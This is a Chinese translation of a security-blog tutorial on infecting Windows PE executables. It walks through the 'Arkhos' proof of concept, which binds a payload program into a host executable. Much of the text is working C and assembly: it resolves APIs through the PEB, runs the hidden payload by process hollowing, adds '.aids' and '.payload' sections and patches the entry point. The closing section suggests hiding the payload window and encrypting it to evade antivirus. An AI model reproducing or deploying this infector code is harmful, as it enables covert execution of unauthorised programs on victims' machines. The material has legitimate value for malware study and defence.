> 原文链接: https://www.anquanke.com//post/id/87223 


# 【技术分享】PE文件感染技术（Part II）


                                阅读量   
                                **101369**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：0x00sec.org
                                <br>原文地址：[https://0x00sec.org/t/pe-file-infection-part-ii/4135](https://0x00sec.org/t/pe-file-infection-part-ii/4135)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t01e9886f7239e64089.jpg)](https://p3.ssl.qhimg.com/t01e9886f7239e64089.jpg)

译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**一、简介**

一年多以前，我发表了[一篇文章](https://0x00sec.org/t/pe-file-infection/401)，介绍了如何使用shellcode来感染可执行文件。从那时起，我又学到了许多新的知识和新的技术，因此最近一段时间，我还想开发另一个PoC，再次完成这个任务。新的PoC与之前的方法途径相同，但融合了我所学的新知识及新技术，更加高级。在本文中，我会介绍一种文件“绑定（binding）”技术。之所以用到“绑定”这个词，原因与这个概念的最初构想有关，因为这个技术使用了与上一篇文章类似的感染机理。我创建了一个项目：[Arkhos](https://gitlab.s-3.tech/93aef0ce4dd141ece6f5/Arkhos)，这个项目的功能是使用一段shellcode（[AIDS](https://gitlab.s-3.tech/93aef0ce4dd141ece6f5/Arkhos/tree/master/AIDS)）来实现PoC效果。顺便提一下，AIDS指的是“Assimilative Infection using Diabolical Shellcode”。

如果想理解并掌握该技术，所需的技能及知识点为：

**C/C++编程技术**

**WinAPI**

**Intel x86汇编技术**

**PE文件格式**

**RunPE/进程Hollow技术（Process Hollowing）**

下文中涉及的相关技术源于我个人对Windows内部机制的研究及理解，如果读者发现其中有何纰漏，请联系我，我会尽快改正。欢迎读者给出任何建设性意见或者建议。



**二、整体过程**

我们的目的是将一个可执行文件A合并到另一个可执行文件B中，具体方法是将一段引导型shellcode（bootstrap shellcode）与可执行载荷结合起来，感染可执行文件B。感染成功后，新的入口点会指向我们设定的引导代码，引导代码首先会使用进程Hollow技术以新进程方式运行载荷，然后跳转到原始入口点，执行原始程序。

成功感染可执行文件后，其文件结构如下所示：

[![](https://p2.ssl.qhimg.com/t016f98b746e20df7fd.png)](https://p2.ssl.qhimg.com/t016f98b746e20df7fd.png)

理想情况下，引导型shellcode可以填充到.text节（section）的代码洞（code cave）中，然而，实际情况中，shellcode的大小可能较大，此时我们可以将其作为一个新的节附加到PE文件中。



**三、Shellcode**

**3.1 开发要点**

在开发shellcode之前，有些要点需要引起我们的注意。最重要的一点就是实现代码的位置无关特性。如果shellcode需要依赖硬编码的位置，那么对于另一个可执行文件来说，相关环境会发生变化，导致shellcode无法成功运行。因此，我们不能依赖一个导入表来调用WinAPI函数，需要这些函数时，我们必须解决字符串问题。

**3.2 动态获取WinAPI函数**

根据Windows对可执行文件的处理方式，我们在内存中总能看到两个DLL文件的身影：**kernel32.dll**以及**ntdll.dll**。我们可以充分利用这个基础，获取由**WinAPI**提供的任何函数地址。在本文中，我们只需要使用这两个DLL文件导出的函数，因为这些函数足以满足我们的需求。

那么，我们如何才能做到这一点？最常见的方法是找到正在运行的程序的PEB结构，该结构的位置为**fs:30h**，然后我们就可以查找并遍历进程中的模块。比如，我们可以查找kernel32.dll和ntdll.dll的基地址。从这些基地址出发，我们可以像查找其他PE文件那样，解析模块的文件，遍历导出函数表，直到找到匹配结果。如果你想了解更详细的过程，你可以参考我写的[另一篇文章](https://0x00sec.org/t/understanding-a-win32-virus-background-material/1043)。实践是检验真理的唯一标准，上述过程的代码实现如下所示：



```
; get kernel32 base address
_get_kernel32:
moveax, [fs:0x30]
moveax, [eax + 0x0C]
moveax, [eax + 0x14]
moveax, [eax]
moveax, [eax]
moveax, [eax + 0x10]
ret
FARPROC GetKernel32Function(LPCSTR szFuncName) `{`
HMODULE hKernel32Mod = get_kernel32();
// get DOS header
PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)(hKernel32Mod);
// get NT headers
PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)hKernel32Mod + pidh-&gt;e_lfanew);
// find eat
PIMAGE_EXPORT_DIRECTORY pied = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hKernel32Mod + pinh-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
// find export table functions
LPDWORD dwAddresses = (LPDWORD)((DWORD)hKernel32Mod + pied-&gt;AddressOfFunctions);
LPDWORD dwNames = (LPDWORD)((DWORD)hKernel32Mod + pied-&gt;AddressOfNames);
LPWORD wOrdinals = (LPWORD)((DWORD)hKernel32Mod + pied-&gt;AddressOfNameOrdinals);
// loop through all names of functions
for (int i = 0; i &lt; pied-&gt;NumberOfNames; i++) `{`
LPSTR lpName = (LPSTR)((DWORD)hKernel32Mod + dwNames[i]);
if (!strcmp(szFuncName, lpName))
return (FARPROC)((DWORD)hKernel32Mod + dwAddresses[wOrdinals[i]]);
`}`
return NULL;
`}`
```

**3.3 动态计算字符串地址**

我们需要解决的另一个问题是字符串地址问题。字符串使用的是硬编码的地址，为了在运行时（run-time）找到这些地址，一种方法是使用delta offset技巧来动态计算字符串的地址，相关计算代码如下所示：



```
string:  db "Hello world!", 0
_get_loc:
    call _loc
_loc:
    pop edx
    ret
_get_string:
    call _get_loc              ; get address of _loc
    sub edx, _loc - string     ; calculate address of string by subtracting
                               ; the difference in bytes from _loc
    mov eax, edx               ; return the address of the string
    ret
```

**3.4 其他依赖源**

其他地方可能会碰到一些依赖问题，比如对某些基础函数（如strlen）的依赖问题，因此我们也需要手动编写这些函数代码。为了避免在编译可执行文件过程中出现任何依赖问题，我选择使用C以及汇编语言，通过gcc以及nasm编译得到目标代码，然后使用ld手动完成链接过程。需要注意的是，函数调用有**相对**以及**绝对**两种形式。想使用相对形式（位置无关代码），它们必须使用E8十六进制操作码。



**四、编写Shellcode**

首先我想先谈谈shellcode代码，因为shellcode是binder程序中必需的一个组件。shellcode需要实现两个目标：以新进程方式运行载荷，然后继续执行原始程序。

具体步骤为：

1、在最后一个section中找到载荷。

2、创建一个挂起的（suspended）进程。

3、掏空进程，为载荷预留空间，空间大小对应从载荷映像（image）基址到映像结束所需的空间大小。

4、为载荷分配内存空间，解析载荷并将载荷写入正确的地址。

5、恢复挂起进程的执行，开始执行载荷。

6、跳转到原始程序的原始入口点。

**4.1 定位payload**

首先需要找到可执行文件最后一个section所对应的相关字节，具体方法为：



```
LPVOID GetPayload(LPVOID lpModule) `{`
// get DOS header
PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)lpModule;
// get NT headers
PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)lpModule + pidh-&gt;e_lfanew);
// find .text section
PIMAGE_SECTION_HEADER pishText = IMAGE_FIRST_SECTION(pinh);
// get last IMAGE_SECTION_HEADER
PIMAGE_SECTION_HEADER pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh-&gt;FileHeader.NumberOfSections - 1));
return (LPVOID)(pinh-&gt;OptionalHeader.ImageBase + pishLast-&gt;VirtualAddress);
`}`
```

**GetPayload**函数的任务非常简单。该函数可以得到一个指针，该指针指向可执行模块在内存中的基址，然后解析PE头部结构，从中我们可以得到一些必要的信息来定位我们寻找的那些节。我们可以使用IMAGE_FIRST_SECTION宏，计算由NT头部提供的偏移信息来找到第一个section。**IMAGE_FIRST_SECTION**宏的代码如下所示：



```
#define IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER)        
    ((ULONG_PTR)(ntheader) +                                            
     FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                 
     ((ntheader))-&gt;FileHeader.SizeOfOptionalHeader   
    ))
```

与数组访问过程类似，利用第一个section的头部地址，我们可以根据section的数量计算偏移量，找到最后一个section的头部。一旦找到最后一个section的头部后，我们可以通过**VirtualAddress**字段找到相对虚拟地址（请记住我们面对的是内存中的可执行文件，而不是原始的文件），该地址与ImageBase相加后就能得到绝对虚拟地址。

**4.2 RunPE/进程Hollow技术（Process Hollowing）**

接下来我们需要模拟Windows映像加载器，将载荷加载到新进程的虚拟内存中。首先，我们需要一个进程，该进程是载荷的写入对象，我们可以使用**CreateProcess**来创建这个进程，在创建进程时指定CREATE_SUSPENDED标志，这样我们就能把进程的可执行模块换成我们自己的载荷。



```
// process info
STARTUPINFO si;
PROCESS_INFORMATION pi;
MyMemset(&amp;pi, 0, sizeof(pi));
MyMemset(&amp;si, 0, sizeof(si));
si.cb = sizeof(si);
si.dwFlags = STARTF_USESHOWWINDOW;
si.wShowWindow = SW_SHOW;
// first create process as suspended
pfnCreateProcessA fnCreateProcessA = (pfnCreateProcessA)GetKernel32Function(0xA851D916);
fnCreateProcessA(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | DETACHED_PROCESS, NULL,NULL, &amp;si, &amp;pi);
```

我们需要使用原始程序的文件来创建新进程。新创建进程的当前状态如下所示（假设原始程序以及载荷使用同样的基址）：

[![](https://p3.ssl.qhimg.com/t0128b9f765236ab296.png)](https://p3.ssl.qhimg.com/t0128b9f765236ab296.png)

需要注意的是，这里我们可能需要使用**DETACHED_PROCESS**标志，这样创建出的进程不是一个子进程，也就是说，如果原始程序所对应的进程结束运行，我们创建的进程也不会被终止。我们可以将wShowWindow字段的值设为SW_HIDE，但这里我会把它设置为SW_SHOW，以便显示载荷进程成功执行的结果。

为了能将载荷写入进程中，我们需要将正在使用的已分配的所有内存unmap掉，只要将基地址作为参数传递给**ZwUnmapViewOfSection**函数即可。



```
// unmap memory space for our process
pfnGetProcAddress fnGetProcAddress = (pfnGetProcAddress)GetKernel32Function(0xC97C1FFF);
pfnGetModuleHandleA fnGetModuleHandleA = (pfnGetModuleHandleA)GetKernel32Function(0xB1866570);
pfnZwUnmapViewOfSection fnZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)fnGetProcAddressfnGetModuleHandleA(get_ntdll_string()), get_zwunmapviewofsection_string());
fnZwUnmapViewOfSection(pi.hProcess, (LPVOID)pinh-&gt;OptionalHeader.ImageBase);
```

新进程被掏空后的示意图如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0108f9254e1b5bedee.png)

现在，我们可以解析载荷的PE文件，将其写入进程的内存空间中。首先，在ImageBase地址处分配大小为SizeOfImage的一段空间，然后使用**WriteProcessMemory**将相关字节写入虚拟地址空间中。



```
// allocate virtual space for process
pfnVirtualAllocEx fnVirtualAllocEx = (pfnVirtualAllocEx)GetKernel32Function(0xE62E824D);
LPVOID lpAddress = fnVirtualAllocEx(pi.hProcess, (LPVOID)pinh-&gt;OptionalHeader.ImageBase, inh-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
// write headers into memory
pfnWriteProcessMemory fnWriteProcessMemory = (pfnWriteProcessMemory)GetKernel32Function0x4F58972E);
fnWriteProcessMemory(pi.hProcess, (LPVOID)pinh-&gt;OptionalHeader.ImageBase, lpPayload, inh-&gt;OptionalHeader.SizeOfHeaders, NULL);
// write each section into memory
for (int i = 0; i &lt; pinh-&gt;FileHeader.NumberOfSections; i++) `{`
// calculate section header of each section
PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD)lpPayload + pidh-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
// write section data into memory
fnWriteProcessMemory(pi.hProcess, (LPVOID)(pinh-&gt;OptionalHeader.ImageBase + pish-&gt;VirtualAddress), (LPVOID)((DWORD)lpPayload + pish-&gt;PointerToRawData), pish-&gt;SizeOfRawData, NULL);
`}`
```

[![](https://p3.ssl.qhimg.com/t01101f2981837aec48.png)](https://p3.ssl.qhimg.com/t01101f2981837aec48.png)

在恢复进程之前，我们需要修改线程的上下文，以便将指令指针（instruction pointer）的起始位置设置为AddressOfEntryPoint。这个步骤完成后，我们就可以安全启动载荷进程。



```
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
pfnGetThreadContext fnGetThreadContext = (pfnGetThreadContext)GetKernel32Function(0x649EB9C1);
fnGetThreadContext(pi.hThread, &amp;ctx);
// set starting address at virtual address: address of entry point
ctx.Eax = pinh-&gt;OptionalHeader.ImageBase + pinh-&gt;OptionalHeader.AddressOfEntryPoint;
pfnSetThreadContext fnSetThreadContext = (pfnSetThreadContext)GetKernel32Function(0x5688CBD8);
fnSetThreadContext(pi.hThread, &amp;ctx);
// resume our suspended processes
pfnResumeThread fnResumeThread = (pfnResumeThread)GetKernel32Function(0x3872BEB9);
fnResumeThread(pi.hThread);
```

最后，我们需要执行原始程序，这一步非常简单：



```
void(*oep)() = (void *)0x69696969;
oep();
```

这里我预留了一个占位符（0x69696969），对应原始的入口点，以方便binder程序修改。



**五、开发Binder程序**

Binder程序的任务相对简单些，只涉及一些文件I/O以及少量PE文件修改操作，具体为：

1、读取目标可执行文件。

2、读取载荷可执行文件。

3、将shellcode注入到合适的section中。

4、将载荷数据附加到新的section中。

5、生成结合后的可执行文件。

**5.1 提取shellcode**

编译完shellcode可执行文件后，该文件应该会对应一个空的导入表，并且所有的data section中都不包含任何数据。所需的所有数据都位于.text section中，所以提取这些字节并将其写入binder的源码中并不是件难事：

```
this-&gt;shellcode = std::vector&lt;BYTE&gt;`{` 0x50, 0x41, 0x59, 0x4C, ... `}`;
```

**5.2 绑定（Binding）过程**

文件I/O代码十分简单，我会跳过这些代码，直接讨论绑定这两个程序的具体过程。存放shellcode的具体位置由两种情况来决定：如果.text section的代码空间足够大，那么shellcode可以存放在这个位置，否则我们需要将其添加为一个新的section。由于这篇文章中我还没有演示如何追加一个新的section来存放数据，为了缩短文章篇幅，这里我只会演示如何使用.text section来完成这个任务。我会在源码中介绍另一种方法。

在添加新section头部之前，我们需要检查是否有足够的空间来存放头部数据。我们需要将第一个section的原始地址与最后一个section尾部的原始地址相减，看结果是否大于等于新section头部大小。如果空间不够，那么绑定该文件的方法就不会那么简单。PE中有些字段用于描述section中的数据，只要理解参数含义，处理好对齐问题，那么创建一个新的section并不难。创建新的section后，我们可以将新头部填入新section的头部空间中，同时也要更新File Header以及Optional Header的值。



```
// check code cave size in .text section
if (pishText-&gt;SizeOfRawData - pishText-&gt;Misc.VirtualSize &gt;= this-&gt;shellcode.size()) `{`
    // insert shellcode into .text section
`}` else `{`
// else create new executable section
// check space for new section header
// get last IMAGE_SECTION_HEADER
PIMAGE_SECTION_HEADER pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh-&gt;FileHeader.NumberOfSections - 1));
PIMAGE_SECTION_HEADER pishNew = (PIMAGE_SECTION_HEADER)((DWORD)pishLast + IMAGE_SIZEOF_SECTION_HEADER);
if (pishText-&gt;PointerToRawData - (DWORD)pishNew &lt; IMAGE_SIZEOF_SECTION_HEADER)
return false;
// create new section header
IMAGE_SECTION_HEADER ishNew;
::ZeroMemory(&amp;ishNew, sizeof(ishNew));
::CopyMemory(ishNew.Name, ".aids", 5);
ishNew.Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
ishNew.SizeOfRawData = ALIGN(this-&gt;shellcode.size(), pinh-&gt;OptionalHeader.FileAlignment);
ishNew.VirtualAddress = ALIGN((pishLast-&gt;VirtualAddress + pishLast-&gt;Misc.VirtualSize), pinh-&gt;OptionalHeader.SectionAlignment);
ishNew.PointerToRawData = ALIGN((pishLast-&gt;PointerToRawData + pishLast-&gt;SizeOfRawData), pinh-&gt;OptionalHeader.FileAlignment);
ishNew.Misc.VirtualSize = this-&gt;shellcode.size();
// fix headers' values
pinh-&gt;FileHeader.NumberOfSections++;
pinh-&gt;OptionalHeader.SizeOfImage = ALIGN((pinh-&gt;OptionalHeader.SizeOfImage + ishNew.Misc.VirtualSize), pinh-&gt;OptionalHeader.SectionAlignment);
// manually calculate size of headers; unreliable
pinh-&gt;OptionalHeader.SizeOfHeaders = ALIGN((pinh-&gt;FileHeader.NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER), pinh-&gt;OptionalHeader.FileAlignment);
// append new section header
::CopyMemory(pishNew, &amp;ishNew, IMAGE_SIZEOF_SECTION_HEADER);
// append new section and copy to output
output.insert(output.end(), target.begin(), target.end());
output.insert(output.end(), this-&gt;shellcode.begin(), this-&gt;shellcode.end());
```

shellcode添加前后的示意图如下所示：

[![](https://p3.ssl.qhimg.com/t01a4e65674b31fdce4.png)](https://p3.ssl.qhimg.com/t01a4e65674b31fdce4.png)

添加载荷section的过程基本相似，代码如下：



```
// append new payload section
// check space for new section header
// get DOS header
pidh = (PIMAGE_DOS_HEADER)output.data();
// get NT headers
pinh = (PIMAGE_NT_HEADERS)((DWORD)output.data() + pidh-&gt;e_lfanew);
// find .text section
pishText = IMAGE_FIRST_SECTION(pinh);
// get last IMAGE_SECTION_HEADER
pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh-&gt;FileHeader.NumberOfSections - 1));
pishNew = (PIMAGE_SECTION_HEADER)((DWORD)pishLast + IMAGE_SIZEOF_SECTION_HEADER);
if (pishText-&gt;PointerToRawData - (DWORD)pishNew &lt; IMAGE_SIZEOF_SECTION_HEADER)
    return false;
    
// create new section header
::ZeroMemory(&amp;ishNew, sizeof(ishNew));
::CopyMemory(ishNew.Name, ".payload", 8);
ishNew.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA;
ishNew.SizeOfRawData = ALIGN(payload.size(), pinh-&gt;OptionalHeader.FileAlignment);
ishNew.VirtualAddress = ALIGN((pishLast-&gt;VirtualAddress + pishLast-&gt;Misc.VirtualSize), pinh-&gt;OptionalHeader.SectionAlignment);
ishNew.PointerToRawData = ALIGN((pishLast-&gt;PointerToRawData + pishLast-&gt;SizeOfRawData), pinh-&gt;OptionalHeader.FileAlignment);
ishNew.Misc.VirtualSize = payload.size();
// fix headers' values
pinh-&gt;FileHeader.NumberOfSections++;
pinh-&gt;OptionalHeader.SizeOfImage = ALIGN((pinh-&gt;OptionalHeader.SizeOfImage + ishNew.Misc.VirtualSize), pinh-&gt;OptionalHeader.SectionAlignment);
pinh-&gt;OptionalHeader.SizeOfHeaders = ALIGN((pinh-&gt;OptionalHeader.SizeOfHeaders + IMAGE_SIZEOF_SECTION_HEADER), pinh-&gt;OptionalHeader.FileAlignment);
// append new section header
::CopyMemory(pishNew, &amp;ishNew, IMAGE_SIZEOF_SECTION_HEADER);
// append new section and copy to output
output.insert(output.end(), payload.begin(), payload.end());
```

载荷添加前后的示意图如下所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01558bee06880c6361.png)

最后一步是更新Optional Header中的入口点地址，替换shellcode中的入口点占位符。



```
// update address of entry point
// redefine headers
// get DOS header
pidh = (PIMAGE_DOS_HEADER)output.data();
// get NT headers
pinh = (PIMAGE_NT_HEADERS)((DWORD)output.data() + pidh-&gt;e_lfanew);
// find .text section
pishText = IMAGE_FIRST_SECTION(pinh);
// get .aids section (now is 2nd last)
pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh-&gt;FileHeader.NumberOfSections - 2));
PIMAGE_SECTION_HEADER pishAids = pishLast;
// calculate new entry point
DWORD dwNewEntryPoint = pishAids-&gt;VirtualAddress + SHELLCODE_START_OFFSET;
pinh-&gt;OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;
// update OEP in shellcode
::CopyMemory(output.data() + pishAids-&gt;PointerToRawData + SHELLCODE_START_OFFSET SHELLCODE_OEP_OFFSET, &amp;dwOEP, sizeof(dwOEP));
```



**六、成果展示**

这里我会展示两个可执行文件绑定后的效果，我选择使用**PEview.exe**作为目标文件，使用**putty.exe**作为载荷文件。

**6.1 程序执行效果**

[![](https://p0.ssl.qhimg.com/t0110506ffaaed1e5af.jpg)](https://p0.ssl.qhimg.com/t0110506ffaaed1e5af.jpg)

**6.2 查看section**

.aids section

[![](https://p1.ssl.qhimg.com/t0121e28bd48245f5f9.jpg)](https://p1.ssl.qhimg.com/t0121e28bd48245f5f9.jpg)

.payload section

[![](https://p5.ssl.qhimg.com/t01ca74447489dce027.jpg)](https://p5.ssl.qhimg.com/t01ca74447489dce027.jpg)



**七、总结**

这种方法不仅可以把简单shellcode注入可执行文件，弹出消息对话框，进一步扩展后可以完成更为复杂的操作，比如可以生成完全独立的可执行文件。只需要掌握PE文件的相关知识、基本的shellcode编写技巧以及Windows系统的一些内部工作原理，我们能发挥的空间（基本）不会受到任何限制。



**八、可改进的地方**

Arkhos只是一个PoC工程，用来演示恶意用户如何在受害者主机上执行未经授权的程序。我们可以做些改进，使这种技术的实际威胁程度大大提高，比如我们可以隐藏载荷的窗口，通过压缩及（或）加密方法来混淆载荷等。就目前而言，许多杀毒软件可以检测出这种组合式可执行程序，可参考[VirusTotal](https://www.virustotal.com/#/file/4f4088b27a590508b47fd34462ce785896691db5ff399b2d3f038d1a5f271855/detection)查看具体的检测结果。

我会在我的[GitLab](https://gitlab.s-3.tech/93aef0ce4dd141ece6f5/Arkhos)上更新源代码及二进制文件。

希望本文能给某些读者带来灵感或启发。
